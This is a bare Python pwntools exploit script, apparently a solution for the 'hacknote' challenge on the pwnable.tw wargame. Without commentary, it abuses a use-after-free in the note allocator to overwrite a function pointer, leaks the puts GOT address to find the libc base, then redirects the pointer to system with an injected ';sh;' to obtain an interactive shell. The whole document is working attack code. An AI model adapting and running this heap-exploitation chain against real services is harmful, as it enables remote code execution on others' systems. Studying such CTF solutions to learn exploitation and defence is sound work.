from pwn import *
import sys
if (len(sys.argv)<2):
    lib = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./hacknote')
else:
    lib = ELF('./libc_32.so.6')
    p = remote('chall.pwnable.tw',10102)
e = ELF('./hacknote')
def mmalloc(size, data):
    p.sendlineafter('choice :','1')
    p.sendlineafter('size :',str(size))
    p.sendlineafter('Content :',data)

def dele(index):
    p.sendlineafter('choice :','2')
    p.sendlineafter('Index :',str(index))

def printt(index):
    p.sendlineafter('choice :','3')
    p.sendlineafter('Index :',str(index))

mmalloc(16,'aaaa')
mmalloc(16,'bbbb')
dele(0)
dele(1)
log.info('puts :' +hex(e.got['puts']))
put_got = p32(e.got['puts'])
print_node = p32(0x0804862b)
mmalloc(8,print_node+put_got)
printt(0)
leak = u32(p.recv(4))
lib.address= leak-lib.sym['puts']
log.info('libc base: '+hex(lib.address))
dele(2)
sys = p32(lib.sym['system'])
bin_sh = p32(lib.search('/bin/sh').next())
mmalloc(8,sys+';sh;')
printt(0)
p.interactive()

